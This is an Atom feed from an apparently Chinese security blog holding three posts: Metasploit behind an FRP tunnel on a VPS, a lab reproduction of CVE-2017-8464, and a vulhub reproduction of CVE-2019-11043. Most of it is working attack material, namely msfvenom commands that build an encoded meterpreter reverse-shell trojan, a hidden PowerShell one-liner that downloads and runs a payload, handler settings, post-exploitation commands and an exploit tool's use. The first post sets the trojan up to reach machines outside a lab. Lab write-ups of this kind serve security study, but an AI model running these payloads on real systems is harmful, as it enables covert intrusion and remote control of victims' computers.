<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>spaceman&#39;blog</title>
  
  
  <link href="https://spaceman-911.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://spaceman-911.gitee.io/"/>
  <updated>2021-02-15T05:23:55.342Z</updated>
  <id>https://spaceman-911.gitee.io/</id>
  
  <author>
    <name>spaceman</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MSF+FRP实现远程渗透</title>
    <link href="https://spaceman-911.gitee.io/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/"/>
    <id>https://spaceman-911.gitee.io/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/</id>
    <published>2021-02-15T04:18:08.000Z</published>
    <updated>2021-02-15T05:23:55.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="msf-frp实现远程渗透"><a class="markdownIt-Anchor" href="#msf-frp实现远程渗透">#</a> MSF-FRP 实现远程渗透</h1><p>首先下载 frp 工具（<a href="https://github.com/fatedier/frp/releases%EF%BC%89%EF%BC%8C%E6%94%BE%E8%87%B3vps%E5%92%8Ckali%EF%BC%8C%E6%88%91%E7%9A%84vps%E6%98%AFcentos7%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E9%80%89%E6%8B%A9%E7%9A%84%E6%98%AF">https://github.com/fatedier/frp/releases），放至 vps 和 kali，我的 vps 是 centos7，所以我选择的是</a> <a href="https://github.com/fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_386.tar.gz">frp_0.35.1_linux_386.tar.gz</a> ，若不了解自己 vps 的体系结构可参考</p><p>linux 系统的体系结构：<a href="https://blog.csdn.net/lixuande19871015/article/details/90485929">https://blog.csdn.net/lixuande19871015/article/details/90485929</a></p><p>frp 支持的 linux 的架构 ：<a href="https://blog.csdn.net/lixuande19871015/article/details/98613711">https://blog.csdn.net/lixuande19871015/article/details/98613711</a></p><h2 id="0x01-vps服务端的配置"><a class="markdownIt-Anchor" href="#0x01-vps服务端的配置">#</a> 0x01 vps 服务端的配置</h2><p>下载 frp 解压至 vps ，编辑 <code>frps.ini</code>  文件，编辑时请勿带注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 6531#frp连接端口</span><br><span class="line">dashboard_addr &#x3D; 0.0.0.0</span><br><span class="line">dashboard_port &#x3D; 7500#网页访问端口</span><br><span class="line">dashboard_user &#x3D; admin#用户名</span><br><span class="line">dashboard_pwd &#x3D; password#密码</span><br><span class="line">token &#x3D; spaceman#frp连接口令</span><br></pre></td></tr></table></figure><p>完成配置，启动服务端</p><p>前台启动： <code>./frps -c frps.ini</code></p><p>后台启动： <code>nohup ./frps -c frps.ini &gt; log.txt &amp;</code></p><p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215131526289.png" alt="image-20210215131526289"></p><p>可登录图形化界面 ip:7500，记得防火墙开启这几个端口</p><p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215131747143.png" alt="image-20210215131747143"></p><h2 id="0x02-kali客户端的配置"><a class="markdownIt-Anchor" href="#0x02-kali客户端的配置">#</a> 0x02 kali 客户端的配置</h2><p>下载 frp 解压至 kali，编辑 <code>frpc.ini</code>  文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 81.xx.xx.xx#vps的ip</span><br><span class="line">server_port &#x3D; 6531#连接frp的端口</span><br><span class="line">token &#x3D; spaceman#连接frp的口令</span><br><span class="line">[msf]</span><br><span class="line">type &#x3D; tcp#连接协议</span><br><span class="line">local_ip &#x3D; 127.0.0.1#本地ip</span><br><span class="line">local_port &#x3D; 6759#本地转发vps端口</span><br><span class="line">remote_port &#x3D; 6000#访问端口，也是木马的端口</span><br></pre></td></tr></table></figure><p>启动 frpc， <code>./frps -c frps.ini</code></p><p>vps 连接成功</p><p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215132017441.png" alt="image-20210215132017441"></p><p>kali 连接成功</p><p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215132057909.png" alt="image-20210215132057909"></p><p>木马制作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;vps LPORT&#x3D;6000 -e x86&#x2F;shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 15 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>msf 设置监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 127.0.0.1</span><br><span class="line">set lport 6759</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>远程小伙伴运行木马测试，成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;msf-frp实现远程渗透&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#msf-frp实现远程渗透&quot;&gt;#&lt;/a&gt; MSF-FRP 实现远程渗透&lt;/h1&gt;
&lt;p&gt;首先下载 frp 工具（&lt;a href=&quot;https://github.c</summary>
      
    
    
    
    
    <category term="MSF" scheme="https://spaceman-911.gitee.io/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-8464远程命令执行漏洞复现</title>
    <link href="https://spaceman-911.gitee.io/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://spaceman-911.gitee.io/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-02-10T17:51:05.000Z</published>
    <updated>2021-02-10T17:54:34.356Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cve-2017-8464远程命令执行漏洞复现"><a class="markdownIt-Anchor" href="#cve-2017-8464远程命令执行漏洞复现">#</a> CVE-2017-8464 远程命令执行漏洞复现</h1><h3 id="漏洞描述"><a class="markdownIt-Anchor" href="#漏洞描述">#</a> 漏洞描述</h3><p>2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危</p><p>Windows 系统通过解析 .LNK 后缀文件时，是使用二进制来解析的，而当恶意的二进制代码被系统识别执行的时候就可以实现远程代码执行，由于是在 explorer.exe 进程中运行的，所以 load 进内存的时候与当前用户具有相同的权限。</p><p>于是攻击者利用这一解析过程的漏洞，将包含恶意二进制的代码被附带进可移动驱动器 (或远程共享过程中)，受害者使用 powershell 解析 .LNK 文件后就会被黑客所控制。</p><p>成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。</p><h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本">#</a> 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">windows 7</span><br><span class="line">windows 8</span><br><span class="line">windows 8.1</span><br><span class="line">windows 10</span><br><span class="line">windows server 2008</span><br><span class="line">windows server 2008 R2</span><br><span class="line">windows server 2012</span><br><span class="line">windows server 2012 R2</span><br><span class="line">windows server 2016</span><br></pre></td></tr></table></figure><h3 id="环境准备"><a class="markdownIt-Anchor" href="#环境准备">#</a> 环境准备</h3><p>攻击机：kali  IP：192.168.30.154</p><p>靶机：Windows 7 X64  IP：192.168.30.153</p><h3 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现">#</a> 漏洞复现</h3><p>使用 kali  msfvenom 生成一个反弹 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali911:~# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.30.154   LPORT&#x3D;5656 -f psh-reflection&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;hack.ps1</span><br></pre></td></tr></table></figure><p>这里生成至 /var/www/html 目录下</p><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604215401138.png" alt="image-20200604215401138"></p><p>启动 Apache 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali911:~# service apache2 restart </span><br><span class="line">root@kali911:~# service apache2 status</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604230022275.png" alt="image-20200604230022275"></p><p>浏览器打开该文件，查看是否成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.ps1</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604215913951.png" alt="image-20200604215913951"></p><p>启动 msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali911:~# msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604220112996.png" alt="image-20200604220112996"></p><p>使用监听模块 multi/handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br></pre></td></tr></table></figure><p>指定 kali 攻击机 IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.30.154</span><br></pre></td></tr></table></figure><p>设置端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 5656</span><br></pre></td></tr></table></figure><p>设置返回载荷</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604220741305.png" alt="image-20200604220741305"></p><p>靶机创建快捷键（桌面右键 -&gt; 新建 -&gt; 快捷方式），输入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.30.154&#x2F;hack.ps1&#39;);test.ps1&quot;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604222706616.png" alt="image-20200604222706616"></p><p>完成创建，运行快捷方式，一闪而过</p><p>回到 kali ，开始攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604223206144.png" alt="image-20200604223206144"></p><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604223447652.png" alt="image-20200604223447652"></p><p>对屏幕进行截图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604230543355.png" alt="image-20200604230543355"></p><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604230622607.png" alt="image-20200604230622607"></p><p>还可进行更多操作这里就不一一介绍了</p><p>登录 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604223548165.png" alt="image-20200604223548165"></p><p>查看当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0&gt;whoami</span><br></pre></td></tr></table></figure><p><img src="/2021/02/11/CVE-2017-8464%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200604224008194.png" alt="image-20200604224008194"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;cve-2017-8464远程命令执行漏洞复现&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cve-2017-8464远程命令执行漏洞复现&quot;&gt;#&lt;/a&gt; CVE-2017-8464 远程命令执行漏洞复现&lt;/h1&gt;
&lt;h3 id=&quot;漏洞</summary>
      
    
    
    
    
    <category term="CVE" scheme="https://spaceman-911.gitee.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-11043漏洞复现</title>
    <link href="https://spaceman-911.gitee.io/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://spaceman-911.gitee.io/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-02-10T14:35:18.000Z</published>
    <updated>2021-02-10T15:39:17.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cve-2019-11043漏洞复现"><a class="markdownIt-Anchor" href="#cve-2019-11043漏洞复现">#</a> CVE-2019-11043 漏洞复现</h1><h2 id="0x01漏洞简介"><a class="markdownIt-Anchor" href="#0x01漏洞简介">#</a> 0x01 漏洞简介</h2><p>nginx + php-fpm 配置不当，当 nginx 配置文件中有 <code>fastcgi_split_path_info</code> ，却没有 <code>if(!-f $document_root$fastcgi_script_name)&#123;return 404;&#125;</code>  的时候就会导致远程代码执行。</p><p>向 Nginx + PHP-FPM 的服务器 URL 发送 %0a 时，服务器返回异常。</p><p>该漏洞需要在 nginx.conf 中进行特定配置才能触发。具体配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^&#x2F;]\.php(&#x2F;|$) &#123;</span><br><span class="line">...</span><br><span class="line">fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br><span class="line">fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">fastcgi_pass   php:9000;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击者可以使用换行符（％0a）来破坏 <code>fastcgi_split_path_info</code>  指令中的 Regexp。 Regexp 被损坏导致 PATH_INFO 为空，从而触发该漏洞。</p><p>影响版本：</p><ul><li>PHP 7.0 版本</li><li>PHP 7.1 版本</li><li>PHP 7.2 版本</li><li>PHP 7.3 版本</li></ul><p>修复建议：</p><ul><li>PHP 7.1.X 更新至 7.1.33</li><li>PHP 7.2.X 更新至 7.2.24</li><li>PHP 7.3.X 更新至 7.3.11</li></ul><h2 id="0x02环境搭建"><a class="markdownIt-Anchor" href="#0x02环境搭建">#</a> 0x02 环境搭建</h2><p>系统：kali</p><h3 id="安装-docker-golang-环境"><a class="markdownIt-Anchor" href="#安装-docker-golang-环境">#</a> 安装 docker、golang 环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br><span class="line">sudo apt install golang</span><br></pre></td></tr></table></figure><h3 id="搭建环境"><a class="markdownIt-Anchor" href="#搭建环境">#</a> 搭建环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br><span class="line">cd vulhub&#x2F;php&#x2F;CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020429046.png" alt="image-20201225020429046"></p><p>查看 docker 环境：</p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020545973.png" alt="image-20201225020545973"></p><p>访问 8080 端口，成功如下</p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020623594.png" alt="image-20201225020623594"></p><h2 id="0x03漏洞利用"><a class="markdownIt-Anchor" href="#0x03漏洞利用">#</a> 0x03 漏洞利用</h2><h3 id="安装漏洞利用工具"><a class="markdownIt-Anchor" href="#安装漏洞利用工具">#</a> 安装漏洞利用工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.git</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line">go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cn</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure><p><a href="http://xn--proxy-2b3hg96kdbzartccz0f9e5b.golang.org">默认使用的是 proxy.golang.org</a>，在国内无法访问，所以换了一个国内能访问的代理地址：<a href="https://goproxy.cn">https://goproxy.cn</a></p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020830346.png" alt="image-20201225020830346"></p><h3 id="工具攻击"><a class="markdownIt-Anchor" href="#工具攻击">#</a> 工具攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;phuip-fpizdam http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php</span><br></pre></td></tr></table></figure><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225021123226.png" alt="image-20201225021123226"></p><p>成功利用，参数名为 a</p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225021301464.png" alt="image-20201225021301464"></p><h2 id="0x04参考链接"><a class="markdownIt-Anchor" href="#0x04参考链接">#</a> 0x04 参考链接：</h2><p><a href="https://blog.csdn.net/weixin_43606134/article/details/107646467">https://blog.csdn.net/weixin_43606134/article/details/107646467</a></p><p><a href="https://blog.csdn.net/qq_43342566/article/details/102733144">https://blog.csdn.net/qq_43342566/article/details/102733144</a></p><p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/111225967">https://blog.csdn.net/weixin_40412037/article/details/111225967</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;cve-2019-11043漏洞复现&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cve-2019-11043漏洞复现&quot;&gt;#&lt;/a&gt; CVE-2019-11043 漏洞复现&lt;/h1&gt;
&lt;h2 id=&quot;0x01漏洞简介&quot;&gt;&lt;a clas</summary>
      
    
    
    
    
    <category term="CVE" scheme="https://spaceman-911.gitee.io/tags/CVE/"/>
    
  </entry>
  
</feed>
